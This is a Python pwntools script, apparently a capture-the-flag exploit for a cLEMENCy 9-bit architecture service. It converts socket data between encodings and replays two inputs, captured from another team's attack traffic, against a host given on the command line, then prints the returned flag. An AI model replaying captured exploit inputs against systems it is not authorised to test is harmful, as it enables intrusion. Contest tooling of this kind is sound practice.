#!/usr/bin/python

from cLEMENCy import *
from pwn import *
from math import *

context.log_level = 'error'

class cremote(remote):
    def recv_raw(self, numb):
        numb = int(ceil(numb*9/8.0))
        if self.closed["recv"]:
            raise EOFError

        while True:
            try:
                data = self.sock.recv(numb)
                break
            except socket.timeout:
                return None
            except IOError as e:
                if e.errno == errno.EAGAIN:
                    return None
                elif e.errno in [errno.ECONNREFUSED, errno.ECONNRESET]:
                    self.shutdown("recv")
                    raise EOFError
                elif e.errno == errno.EINTR:
                    continue
                else:
                    raise

        if data == '':
            self.shutdown("recv")
            raise EOFError

        data = b2c(data)

        return data

    def recvline (self):
        if self.closed["recv"]:
            raise EOFError
        data = ""
        while True:
            try:
                data += self.sock.recv(1)
                if '\n' in c2s(b2c(data)):
                  break
            except socket.timeout:
                return None
            except IOError as e:
                if e.errno == errno.EAGAIN:
                    return None
                elif e.errno in [errno.ECONNREFUSED, errno.ECONNRESET]:
                    self.shutdown("recv")
                    raise EOFError
                elif e.errno == errno.EINTR:
                    continue
                else:
                    raise

        if data == '':
            self.shutdown("recv")
            raise EOFError

        data = b2c(data)

        return data


    def send_raw(self, data):
        if self.closed["send"]:
            raise EOFError

        try:
            if isinstance(data, cBytes):
                data = c2b(data)
            elif type(data) == str:
                data = c2b(s2c(data))

            self.sock.sendall(data)
        except IOError as e:
            eof_numbers = [errno.EPIPE, errno.ECONNRESET, errno.ECONNREFUSED]
            if e.message == 'Socket is closed' or e.errno in eof_numbers:
                self.shutdown("send")
                raise EOFError
            else:
                raise

'''
ttacker(36246) >>> server(5050)
2017-07-29 18:31:56
1501378316.37
198d06a371c8806a30188e46820389c414

34579 50194 qq


attacker(36246) >>> server(5050)
2017-07-29 18:31:56
1501378316.47
1b0dc62371a0d06030100d464321c0c4407138880560a0

67174400 52281 qq +
'''
            
tt = [
    '34579 50194 qq',
    '67174400 52281 qq +',
]

#p = process('./clemency-emu -l 0 hello_patch.bin', shell=True)
r = cremote(sys.argv[1], 12344)

for ttt in tt:
    d = r.recv_raw(100)
    print 'recv',c2s(d)
    
    payload = ttt
    payload += '\n'
    print 'send', payload
    r.send_raw ( payload )

    time.sleep(0.1)

res = ''
# while(1):
d = c2s(r.recvline ())[:-1]
# print d
print d[d.find(": ")+2:]

# print c2s(d)
# print c2s(b2c(d))
